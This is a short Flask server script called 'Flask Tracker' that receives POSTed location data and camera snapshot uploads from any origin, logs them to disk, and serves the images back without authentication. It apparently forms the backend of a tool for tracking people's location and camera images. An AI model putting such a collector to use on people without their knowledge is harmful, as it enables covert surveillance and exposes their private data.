from flask import Flask, request, send_from_directory
from flask_cors import CORS
from datetime import datetime
import os
import sys

app = Flask(__name__)
CORS(app)
os.makedirs("snapshots", exist_ok=True)

@app.route("/")
def index():
    return "✅ Flask Tracker is Running"

@app.route("/location", methods=["POST"])
def location():
    data = request.get_json()
    print("📍 Location Received:", data)
    with open("location_log.txt", "a") as f:
        f.write(f"{datetime.now()} - {data}\n")
    return "Location saved"

@app.route("/upload", methods=["POST"])
def upload():
    image = request.files["snapshot"]
    filename = f"snapshots/snapshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
    image.save(filename)
    print(f"📸 Snapshot saved: {filename}")
    return "Snapshot saved"

@app.route("/snapshots/<filename>")
def get_snapshot(filename):
    return send_from_directory("snapshots", filename)

# ✅ THIS PART IS CRUCIAL
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
